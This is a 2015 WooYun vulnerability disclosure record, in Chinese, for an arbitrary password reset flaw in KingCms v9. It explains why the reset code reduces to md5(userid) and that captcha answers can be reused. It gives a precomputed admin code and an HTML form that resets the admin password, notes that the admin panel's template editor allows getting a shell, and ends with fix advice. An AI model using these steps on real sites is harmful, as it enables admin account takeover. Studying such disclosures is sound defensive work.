{"id": 82538, "wybug_id": "wooyun-2015-0150759", "wybug_title": "KingCms最新版v9任意用户密码重置", "wybug_corp": "KingCms", "wybug_author": "路人甲", "wybug_date": "2015-11-04 18:34", "wybug_open_date": "2015-12-19 18:36", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-04：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-12-19：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： KingCms最新版v9任意用户密码重置 详细说明：  在user/manage.php\n\n298行 if($code <> $usercode) kc_tip('提交的参数不正确!','form');通过比较$code和$usercode是否相同来重置密码而$usercode = md5($rs['userid'] . $rs['email'] . $rs['salt']);email是注册以后在个人资料里面再填的，所以基本上为空，那salt呢，再从数据库里看看salt\n\nsalt默认为空，也就是salt没用处，mail也基本不会更改，所以也为空，剩下userid是从10000开始注册的。也就是说如果$usercode=md5($['userid'])再看291行checkcode函数，cltr+shit+r跟踪这个函数\n\n程序如何校验验证码呢？通过接收checkcode_id和checkcode_answer参数，然后通过checkcode_id到数据库中查询相应答案，比对checkcode_answer和数据库中的答案是否一致那么我们可以通过抓取正常登录或者注册的包，停在这个页面上，数据库就会生成checkcode_id和checkcode_answer而不会被销毁掉\n\n\n\n   漏洞证明：  根据上面分析，重置官网http://**.**.**.**/,id为10000(admin)的用户密码，则code值为b7a782741f667201b54880c925faec4b，重置密码为wooyun123先在官网登陆，burp抓包，定在这，不要forword前进\n\n得到checkcode_id=1083，checkcode_answer=32然后本地构造post表单\n<html><form action=\"http://**.**.**.**/user/manage.php?CMD=resetpassword\" method=\"post\">  <p>userid: <input type=\"text\" name=\"userid\" value='10000'/></p>  <p>new_password: <input type=\"text\" name=\"new_password\" value='wooyun123'/></p>  <p>confirm_password: <input type=\"text\" name=\"confirm_password\" value='wooyun123'/></p>    <p>code: <input type=\"text\" name=\"code\" value='b7a782741f667201b54880c925faec4b'/></p>  <p>checkcode_id: <input type=\"text\" name=\"checkcode_id\"/></p>  <p>checkcode_answer: <input type=\"text\" name=\"checkcode_answer\" /></p><input type=\"submit\" value=\"Submit\" /></form></html>\n成功修改admin密码wooyun123\n\n登录官网\n\n后台有编辑模板功能，直接可以添加编辑php文件，可getshell，不过官网的default路径被故意删除了吧，默认编辑模板路径templates/default/,没有http://**.**.**.**/templates/default/路径，所以编辑的文件没有路径，导致无法getshell，正常情况是可以的，本地也是可以的\n\n   修复方案：  salt不要为空mail在注册接口注册验证码不要重复使用   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评价\n     2016-01-25 16:45 |    \t\tgniq \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:1        | 学习无止境，生活更美好)\t\t \n  用的ctags跟踪？    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}